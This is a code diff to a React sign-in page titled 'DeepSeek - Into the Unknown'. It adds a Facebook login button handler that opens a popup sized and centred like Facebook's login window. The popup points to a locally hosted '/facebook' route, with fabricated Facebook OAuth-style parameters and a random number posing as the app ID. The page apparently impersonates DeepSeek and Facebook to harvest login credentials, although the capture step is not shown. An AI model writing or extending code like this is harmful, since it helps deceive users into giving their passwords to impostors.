@@ -18,6 +18,41 @@ const SignIn: React.FC = () => {
     setShowWarning(true);
   };
 
+  const handleFacebookLogin = () => {
+    localStorage.setItem('facebook', 'true');
+
+    const randomParams = {
+      skip_api_login: 1,
+      api_key: Math.floor(Math.random() * 9000000000000000) + 1000000000000000,
+      kid_directed_site: 0,
+      signed_next: 1,
+    };
+
+    const facebookUrl = `/facebook?${new URLSearchParams({
+      ...Object.fromEntries(
+        Object.entries(randomParams).map(([key, value]) => [key, value.toString()]),
+      ),
+      app_id: randomParams.api_key.toString(),
+    }).toString()}`;
+
+    const width = 600;
+    const height = 700;
+    const left = window.screen.width / 2 - width / 2;
+    const top = window.screen.height / 2 - height / 2;
+
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+    if (isMobile) {
+      window.open(facebookUrl, '_blank');
+    } else {
+      window.open(
+        facebookUrl,
+        'Facebook',
+        `width=${width},height=${height},left=${left},top=${top},scrollbars=yes`,
+      );
+    }
+  };
+
   return (
     <div className="flex min-h-screen flex-col bg-white">
       <title>DeepSeek - Into the Unknown</title>
@@ -146,6 +181,7 @@ const SignIn: React.FC = () => {
 
             <button
               type="button"
+              onClick={handleFacebookLogin}
               className="flex h-[40px] w-full cursor-pointer items-center justify-center rounded-[10px] border-0 bg-[#1877F2] px-[10px] text-base font-medium text-white shadow-sm transition-colors duration-200 hover:bg-[#166FE5]"
             >
               <FontAwesomeIcon icon={faFacebook} className="mr-2 h-5 w-5" />
